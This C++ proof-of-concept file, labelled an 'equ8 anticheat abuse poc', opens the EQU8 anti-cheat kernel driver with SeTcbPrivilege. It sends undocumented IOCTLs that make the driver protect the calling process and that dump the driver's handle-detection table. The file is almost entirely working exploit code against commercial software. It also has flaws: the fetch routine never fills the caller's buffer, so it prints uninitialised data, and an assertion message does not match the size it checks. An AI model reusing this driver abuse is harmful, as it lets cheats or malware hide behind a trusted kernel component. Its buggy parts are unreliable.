/*
    MIT License

    Copyright (c) 2021 Kento Oki

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:
    
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
*/

#include <windows.h>
#include <iostream>
#include <TlHelp32.h>

// Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EQU8_HELPER_36\SessionId
#define EQU8_DEVICE_NAME "\\\\.\\EQU8_mbo9m6goucC8IrEd"
#define EQU8_IOCTL_ETW_ENABLE_TRACE CTL_CODE(0x22, 0x810, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define EQU8_IOCTL_ENABLE_PROTECT CTL_CODE(0x22, 0x814, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define EQU8_IOCTL_ADD_WHITELIST_PROCESS CTL_CODE(0x22, 0x812, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define EQU8_IOCTL_FETCH_DETECTION_TABLE CTL_CODE(0x22, 0x811, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

using unique_handle = std::unique_ptr<void, decltype(&CloseHandle)>;
static HANDLE device_handle = INVALID_HANDLE_VALUE;

#pragma pack(1) // 1 alignment because it's 13 size
typedef struct _EQU8_DETECTION_ENTRY
{
    ACCESS_MASK mask;
    DWORD requestor_pid;
    DWORD protected_pid;
    bool is_kernel_handle;
}EQU8_DETECTION_ENTRY, * PEQU8_DETECTION_ENTRY;
#pragma pack()
static_assert(sizeof(EQU8_DETECTION_ENTRY) == 0xD, "entry size must be 0xD");

typedef struct _EQU8_DETECTION_TABLE
{
    DWORD count; // Number of entries
    EQU8_DETECTION_ENTRY entries[0x20];
}EQU8_DETECTION_TABLE, * PEQU8_DETECTION_TABLE;
static_assert(sizeof(EQU8_DETECTION_TABLE) == 0x1A4, "table size must be 0x1A0");

bool init()
{
    // In order to acquire driver device handle, we need to have SeTcbPrivilege
    // because EQU8 driver IRP_MJ_CREATE function checks for the privilege token 7 (SeTcbPrivilege)
    device_handle = CreateFile(TEXT(EQU8_DEVICE_NAME), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, NULL, NULL);

    if (device_handle == INVALID_HANDLE_VALUE)
    {
        printf("[!] failed to obtain device handle\n");
        return false;
    }

    printf("[+] handle opened 0x%llX\n", (uint64_t)device_handle);

    return true;
}

bool set_privilege(const std::wstring& privilege, bool enable)
{
    bool result;
    LUID luid;
    HANDLE htoken;
    TOKEN_PRIVILEGES token_priv;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &htoken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, privilege.data(), &luid))
    {
        CloseHandle(htoken);
        return FALSE;
    }

    token_priv.PrivilegeCount = 1;
    token_priv.Privileges[0].Luid = luid;
    token_priv.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;

    result = AdjustTokenPrivileges(htoken, FALSE, &token_priv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(htoken);
    return result && GetLastError() == ERROR_SUCCESS;
}

bool has_privilege(const std::wstring& privilege)
{
    bool result = false;
    BOOL pfResult = FALSE;
    HANDLE htoken = NULL;
    PRIVILEGE_SET priv_set;
    LUID luid = { 0 };

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken))
    {
        if (LookupPrivilegeValue(NULL, privilege.data(), &luid))
        {
            priv_set.PrivilegeCount = 1;
            priv_set.Control = PRIVILEGE_SET_ALL_NECESSARY;
            priv_set.Privilege[0].Luid = luid;
            priv_set.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

            result = PrivilegeCheck(htoken, &priv_set, &pfResult);
        }
    }

    if (htoken)
        CloseHandle(htoken);

    return result && pfResult;
}

uint32_t find_process(const std::wstring& process_name)
{
    PROCESSENTRY32 process_entry{ sizeof(PROCESSENTRY32W) };
    unique_handle snapshot{ CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL), &CloseHandle };

    if (snapshot.get() == INVALID_HANDLE_VALUE)
        return NULL;

    Process32First(snapshot.get(), &process_entry);

    if (!process_name.compare(process_entry.szExeFile))
        return process_entry.th32ProcessID;

    while (Process32Next(snapshot.get(), &process_entry))
        if (!process_name.compare(process_entry.szExeFile))
            return process_entry.th32ProcessID;

    return NULL;
}

bool equ8_enable_protect(const uint32_t process_id)
{
    uint32_t buffer = process_id;
    DWORD bytes_returned = 0;
    return DeviceIoControl(device_handle, EQU8_IOCTL_ENABLE_PROTECT, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &bytes_returned, NULL);
}

bool equ8_fetch_detection(PEQU8_DETECTION_TABLE buffer)
{
    BOOL result;
    DWORD bytes_returned = 0;
    EQU8_DETECTION_TABLE table = { 0 };
    RtlZeroMemory(&table, sizeof(table));
    result = DeviceIoControl(device_handle, EQU8_IOCTL_FETCH_DETECTION_TABLE, &table, sizeof(table), &table, sizeof(table), &bytes_returned, NULL);
    return result && bytes_returned;
}

int wmain(int argc, const wchar_t** argv, const wchar_t** envp)
{
    printf("[~] equ8 anticheat abuse poc\n");

    if (argc != 2)
    {
        std::cin.get();
        return EXIT_SUCCESS;
    }

    if (!has_privilege(SE_TCB_NAME))
    {
        printf("[!] SeTcbPrivilege is not present\n");

        if (!set_privilege(SE_TCB_NAME, true))
        {
            printf("[!] failed to enable SeTcbPrivilege (GetLastError: 0x%lX)\n", GetLastError());
            return EXIT_FAILURE;
        }
    }

    if (!init())
    {
        printf("[!] failed to initialize exploit (GetLastError: 0x%lX)\n", GetLastError());
        return EXIT_FAILURE;
    }
    else
        printf("[+] EQU8 initialization success\n");

    if (!equ8_enable_protect(GetCurrentProcessId()))
    {
        printf("[!] failed to enable protect (GetLastError: 0x%lX)\n", GetLastError());
        return EXIT_FAILURE;
    }
    else
        printf("[+] I am %d is now protected by EQU8!\n", GetCurrentProcessId());

    if (argc == 2)
    {
        if (!std::wstring(argv[1]).empty())
        {
            STARTUPINFO info = { sizeof(info) };
            PROCESS_INFORMATION process_info;
            if (CreateProcess(argv[0], (LPWSTR)L"", NULL, NULL, TRUE, 0, NULL, NULL, &info, &process_info))
            {
                printf("[+] child process: %d open me!\n", process_info.dwProcessId);
                CloseHandle(process_info.hProcess);
                CloseHandle(process_info.hThread);
            }
            else
                // This must be fail with 0x5 (ACCESS_DENIED) if protect succeeded
                printf("[!] failed to create child process (GetLastError: 0x%lX)\n", GetLastError());
        }
    }

    EQU8_DETECTION_TABLE table;
    if (!equ8_fetch_detection(&table))
    {
        printf("[!] failed to fetch detection data (GetLastError: 0x%lX)\n", GetLastError());
        return EXIT_FAILURE;
    }
    else
    {
        printf("[~] detection data fetched from equ8 driver\n");

        for (auto i = 0; i < table.count; i++)
        {
            const auto entry = &table.entries[i];

            printf("[*] DetectionEntry[%d] %d %lX %d %d\n",
                i,
                entry->is_kernel_handle,
                entry->mask,
                entry->requestor_pid, entry->protected_pid);
        }
    }

    CloseHandle(device_handle);
    return EXIT_SUCCESS;
}
